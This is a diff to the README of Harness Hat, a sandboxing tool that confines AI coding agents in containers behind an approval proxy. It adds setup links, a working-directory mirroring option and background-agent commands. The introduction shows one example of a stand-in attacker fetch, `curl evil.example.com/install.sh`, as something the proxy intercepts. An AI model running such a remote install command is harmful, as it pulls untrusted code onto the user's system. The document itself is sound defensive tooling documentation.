@@ -10,13 +10,15 @@ Modern coding agents (`claude`, `codex`, `antigravity`, `pi`, …) want to read 
 
 Harness Hat boxes each session in a container with:
 
-- A real shell, real toolchains, your repo bind-mounted at `/workspace`.
+- A real shell, real toolchains, your repo bind-mounted at `/workspace` by default.
 - A scoped HTTP/CONNECT proxy that **prompts before allowing unknown hosts**, persists your decisions to `harness-rules.toml`, and refuses anything denied.
 - **Strict-network mode**: `tun2proxy` + `iptables` capture *all* outbound TCP, so agents can't bypass the proxy by ignoring `HTTPS_PROXY`.
 - Per-session seeded mounts for `~/.claude.json`-style files that agents rewrite in place, so two concurrent sessions can't corrupt each other.
 - Container bootstrap for proxy routing, strict egress rules, localhost forwards, agent state mounts, and common coding-agent CLIs.
 
 If an agent wants to `curl evil.example.com/install.sh`, it asks first. You see the request. You decide.
+
+For a task-oriented walkthrough, see the [User Guide](<User Guide/README.md>).
 
 ## How it compares
 
@@ -33,9 +35,12 @@ Harness Hat overlaps with several development-environment, agent-sandbox, and co
 
 ## Requirements
 
-- A macOS, Linux, or Windows 11 host with Docker and the `docker` CLI on your `PATH`. Windows support targets Docker Desktop with the WSL2 backend running Linux containers; Windows containers are not supported.
-- A Rust toolchain, for `cargo install`.
+- A macOS, Linux, or Windows 11 host with [Docker](https://docs.docker.com/get-docker/) and the `docker` CLI on your `PATH`. Windows support targets Docker Desktop with the WSL2 backend running Linux containers; Windows containers are not supported.
+- A [Rust toolchain](https://www.rust-lang.org/tools/install), for `cargo install`.
+- To use Claude Code setup-token authentication: Node.js 18+ and [Claude Code installed locally](https://docs.anthropic.com/en/docs/claude-code/getting-started).
 - For strict-network mode: `/dev/net/tun` inside the Linux container. See [Container privileges](#container-privileges) for what this implies — it matters if your organization restricts privileged containers.
+
+The [setup guide](<User Guide/01-setup.md>) includes platform-specific Docker links, verification commands, Linux permission setup, Rust installation, and local Claude Code setup.
 
 ## Quick start
 
@@ -181,7 +186,15 @@ Strict mode changes how the container is started:
 
 ## Filesystem mounts
 
-Every session mounts the workspace at `/workspace`. Add extra host paths with `[[defaults.containers.mounts]]` for every template, or `[[container_profiles.<name>.mounts]]` for one template. Mount changes apply when a new session container starts; restart an existing session to pick them up.
+By default, every session mounts the workspace at `/workspace`. Add extra host paths with `[[defaults.containers.mounts]]` for every template, or `[[container_profiles.<name>.mounts]]` for one template. Mount changes apply when a new session container starts; restart an existing session to pick them up.
+
+To mirror an absolute POSIX workspace path inside the Linux container instead, opt in through the global or project `harness-rules.toml`:
+
+```toml
+mirror_cwd = true
+```
+
+For example, `/home/user/my-project` is mounted at `/home/user/my-project` and becomes the container working directory. The effective source is the launch directory when `mount_cwd = true`, otherwise `canonical_path`. Native Windows paths cannot be represented exactly inside Linux containers, so Harness Hat keeps the configured mount target and logs that fallback.
 
 ```toml
 [[defaults.containers.mounts]]
@@ -253,7 +266,7 @@ Harness Hat narrows what an agent can reach; it does not make a malicious agent 
 
 - **TLS is not decrypted.** Policy sees only the CONNECT host and port. Allowing a host allows everything that host serves — an agent allowed to reach `github.com` can push data to any repository it can authenticate to.
 - **Passed-through secrets are readable.** Anything in `env_passthrough` (e.g. `ANTHROPIC_API_KEY`) is visible to every process in the session, including the agent.
-- **Your repo is writable.** `/workspace` is a read-write bind mount. Agents can edit source, configs, and git hooks — review diffs before running the result on the host.
+- **Your repo is writable.** The workspace path is a read-write bind mount. Agents can edit source, configs, and git hooks — review diffs before running the result on the host.
 - **Container isolation is Docker's.** A kernel or runtime escape is outside Harness Hat's control, and strict mode on macOS starts the container privileged (see [Container privileges](#container-privileges)).
 
 ## Configuration overview
@@ -398,8 +411,11 @@ hht                       # launch interactive workspace manager (default)
 hht --config PATH         # use a specific config
 hht init [PATH]           # write a starter config (default: ./harness-hat.toml)
 hht workspace             # attach to or start a session for the current directory
+hht workspace --list      # list configured workspaces
 hht workspace [--name WORKSPACE] [--template NAME] [--rebuild] [COMMAND...]
 hht rebuild [--no-cache] [TEMPLATE...] # rebuild base + selected/all templates
+hht install                 # start the per-user background agent at graphical login
+hht uninstall               # remove the per-user background agent
 hht shell                 # list running sessions
 hht shell <ID> [COMMAND...] # docker exec into a running session
 ```
@@ -413,6 +429,12 @@ cargo install harness-hat --force
 Container images are built locally from the Dockerfiles under `docker_dir` and tagged `harness-hat-base:local`. After upgrading `hht` or changing a Dockerfile, rebuild the image from the TUI so new sessions pick up the changes — running sessions keep their existing image until restarted.
 
 Use `hht rebuild` to rebuild the base image followed by every Dockerfile template in the configured `docker_dir`. Pass template stems to rebuild only selected images, for example `hht rebuild go python`; add `--no-cache` to bypass Docker's layer cache for both the base and template images. This command does not require the manager TUI to be running.
+
+### Background agent
+
+`hht install` creates the default global config at `~/.config/harness-hat/harness-hat.toml` when it is missing, then installs a per-user desktop agent using launchd on macOS, a systemd user unit on Linux, or a Task Scheduler logon task on Windows. It starts the control server, scoped proxies, workspace-launch path, and native approval dialogs without requiring a terminal. It is intentionally not a privileged system service: it runs only in the signed-in desktop session so it can use that user's Docker access and show approval dialogs. Use `hht uninstall` to stop and remove the agent.
+
+When the agent is active, use `hht workspace` and `hht shell` for session work. Approval decisions are native system dialogs; if the desktop dialog backend is unavailable, requests remain denied rather than falling back to an invisible prompt.
 
 ## License
 
